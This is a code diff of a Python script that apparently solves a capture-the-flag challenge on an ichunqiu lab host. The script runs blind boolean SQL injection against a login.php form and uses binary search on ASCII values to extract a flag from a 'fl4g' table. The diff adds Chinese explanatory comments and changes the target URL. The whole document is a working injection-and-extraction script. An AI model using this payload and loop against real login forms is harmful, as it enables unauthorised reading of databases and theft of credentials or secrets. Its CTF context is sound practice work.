@@ -20,11 +20,11 @@ def Get(url):
             name = "admin' and if(ascii(mid((Select flag from fl4g),{0},1))>{1},1,0)#".format(i, mid)
             data = {"name":name,"pass":"1223234"}
             res = requests.post(url,data)
-            if "\\u8d26\\u53f7\\u6216\\u5bc6\\u7801\\u9519\\u8bef" in res.content.decode():
-                left = mid+1
+            if "\\u8d26\\u53f7\\u6216\\u5bc6\\u7801\\u9519\\u8bef" in res.content.decode(): #正确回显
+                left = mid+1 #字段中的字符的ASCII码大于mid值时执行
             else:
                 right = mid
-            mid = (left+right)//2
+            mid = (left+right)//2 #字段中的字符的ASCII码小于或等于mid值时执行
         #查询结果结束
         if mid==32:
             break
@@ -32,4 +32,4 @@ def Get(url):
         print(result)
     print(result)
 
-Get('http://eci-2zeblkxo998nmf2ht3eo.cloudeci1.ichunqiu.com/login.php')
+Get('http://eci-2ze3r9vbw6bofm47wcsp.cloudeci1.ichunqiu.com/login.php')
